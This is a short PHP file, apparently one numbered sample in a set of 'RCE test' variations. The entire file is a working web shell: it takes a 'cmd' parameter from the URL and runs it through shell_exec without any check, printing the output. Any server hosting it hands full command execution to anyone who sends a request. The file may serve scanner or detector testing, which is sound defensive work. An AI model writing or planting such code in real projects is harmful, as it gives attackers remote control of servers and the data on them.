<?php
// RCE test variation #1402
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>